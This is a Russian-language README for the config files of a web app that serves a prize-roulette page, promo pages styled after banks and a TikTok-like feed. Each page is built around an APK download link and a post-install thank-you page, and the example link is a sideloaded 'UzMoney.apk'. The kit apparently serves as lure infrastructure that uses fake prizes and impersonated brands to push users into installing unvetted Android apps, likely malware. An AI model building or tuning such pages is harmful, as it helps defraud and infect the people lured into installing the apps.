# Конфигурационные файлы

Эта папка содержит JSON файлы конфигурации для различных страниц приложения.

## Как это работает

Все конфигурационные файлы хранятся в папке `public/config/` и загружаются динамически при открытии страницы. Это позволяет изменять содержимое страниц без необходимости пересборки приложения и пуша изменений в Git.

## Доступные конфигурации

### roulette_premium.json
Конфигурация для страницы рулетки LARGO SPIN:
- `prizes` - массив призов для рулетки
- `apkUrl` - ссылка на APK файл для скачивания
- `texts` - все текстовые элементы страницы
- `settings` - настройки (количество оборотов, длительность анимации)

### ormbank.json / bankuz.json
Конфигурация для банковских промо-страниц:
- `apkUrl` - ссылка на APK файл
- `thankYouUrl` - URL страницы благодарности после установки
- `texts` - все текстовые элементы
- `contact` - контактная информация
- `logo` - путь к логотипу

### tiktoklikesite.json
Конфигурация для TikTok-подобной страницы:
- `apkUrl` - ссылка на APK файл
- `thankYouUrl` - URL страницы благодарности
- `videos` - массив видео/постов для ленты
- `texts` - текстовые элементы (логотип, описание, кнопки)

## Как изменить конфигурацию

1. Откройте нужный JSON файл в папке `public/config/`
2. Измените нужные значения
3. Сохраните файл
4. Обновите страницу в браузере - изменения применятся автоматически!

**Важно:** После изменений JSON файлов не нужно:
- Пересобирать приложение (`npm run build`)
- Пушнуть изменения в Git
- Перезапускать сервер разработки

Изменения вступят в силу сразу после сохранения файла.

## Примеры изменений

### Изменить ссылку на APK файл

В `roulette_premium.json`:
```json
{
  "apkUrl": "https://uzbekistan-info.vercel.app/docs/UzMoney.apk"
}
```

### Изменить текст кнопки

В `roulette_premium.json`:
```json
{
  "texts": {
    "spinButton": "НАЧАТЬ ВРАЩЕНИЕ",
    "spinningButton": "ВРАЩАЕТСЯ..."
  }
}
```

### Изменить призы в рулетке

В `roulette_premium.json`:
```json
{
  "prizes": [
    {
      "id": 0,
      "type": "win",
      "amount": 500000,
      "color": "#FFD700",
      "image": "https://example.com/money.png"
    }
  ]
}
```

## Валидация JSON

Убедитесь, что JSON файлы имеют правильный синтаксис. Если файл содержит ошибки, страница покажет сообщение об ошибке загрузки конфигурации.

Проверить JSON можно на сайте https://jsonlint.com/
